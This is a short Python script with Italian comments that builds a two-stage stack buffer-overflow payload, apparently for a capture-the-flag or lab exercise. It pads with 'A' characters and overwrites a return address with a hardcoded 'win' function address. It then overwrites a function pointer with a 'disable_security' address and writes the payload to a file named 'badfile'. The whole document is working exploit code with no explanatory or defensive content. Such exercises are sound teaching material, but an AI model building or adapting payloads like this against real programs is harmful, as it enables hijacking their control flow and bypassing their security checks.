#note

import os
import struct

#devo fare due overflow: il primo sul buffer nel main e il secondo su print_function (penso)

win = 0x8048539
disable_security = 0x804850b

#payload = payload1 (print_function_bof_payload) + payload2 (fp_bof_payload)

#payload1 e` per l'overflow dentro print_address !!
#payload1 = A*dst_len + win_addr

payload1 = "A"*230
payload1 += struct.pack("I", win)

#payload2 e` per riuscire a chiamare print_function grazie ad fp quindi con l'overflow su str
#payload2 = A*(str_len - len(payload1)) + disable_security_check_addr

padding = 260 - len(payload1)

payload2 = "A"*padding
payload2 += struct.pack("I", disable_security)

payload = payload1
payload += payload2

f = open("badfile", "a")
f.write("%s" % payload)
f.close()
